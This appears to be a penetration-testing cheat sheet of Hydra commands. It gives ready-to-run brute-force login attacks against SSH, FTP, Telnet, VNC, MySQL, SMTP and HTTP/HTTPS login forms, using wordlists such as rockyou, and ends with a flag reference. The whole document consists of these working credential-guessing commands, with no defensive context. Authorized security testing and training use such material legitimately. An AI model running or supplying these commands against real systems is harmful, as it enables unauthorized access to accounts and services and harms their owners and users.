# HYDRA



# SSH (single user)
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -V -o hydra-ssh.txt ssh://192.168.1.100

# SSH (multi-host from file)
hydra -L users.txt -P passlist.txt -M hosts.txt -t 2 -V -o hydra-ssh-multi.txt ssh

# FTP (user list + passlist)
hydra -L users.txt -P passwords.txt -t 6 -V -o hydra-ftp.txt ftp://192.168.1.50
hydra -t 4 -l "username" -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

# Telnet (single user)
hydra -l admin -P /usr/share/wordlists/fast.txt -t 6 -V -o hydra-telnet.txt telnet://10.0.0.20

# VNC (password list)
hydra -P /usr/share/wordlists/vnc.txt -t 4 -V -o hydra-vnc.txt vnc://192.168.1.120

# MySQL (db auth)
hydra -L dbusers.txt -P dbpass.txt -s 3306 -t 4 -V -o hydra-mysql.txt mysql://192.168.1.200

# SMTP (AUTH)
hydra -L users.txt -P pass.txt -s 587 -t 4 -V -o hydra-smtp.txt smtp://mail.example.com

# HTTP POST form (replace PATH, failure string)
# Template: "/path:field1=^USER^&field2=^PASS^:F=FailureString"
hydra -L users.txt -P pass.txt -t 8 -V -o hydra-http.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# HTTPS (use https-post-form if available)
hydra -L users.txt -P pass.txt -t 6 -V -o hydra-https.txt 10.10.10.10 https-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Use a combo file (user:pass per line)
hydra -C combos.txt -t 4 -V -o hydra-combo.txt ftp://192.168.1.50

# Exit on first found for a host
hydra -l admin -P passlist.txt -f -t 4 -V ssh://192.168.1.100 -o hydra-firstfound.txt

# Use SSL/TLS where supported (service modules vary)
hydra -L users.txt -P pass.txt -S -t 4 -V -o hydra-ssl.txt smtp://mail.example.com:465

# Helpful quick flags:
# -l <user>       single username
# -L <file>       username list
# -p <pass>       single password
# -P <file>       password list
# -C <file>       combo file (user:pass)
# -M <file>       target hosts list
# -t <tasks>      parallel tasks (threads)
# -V              verbose (show attempts)
# -f              stop after first valid credential per host
# -o <file>       write found results

# Example: multi-target, threaded, write results
hydra -L users.txt -P passlist.txt -M targets.txt -t 3 -V -f -o hydra-results.txt ssh
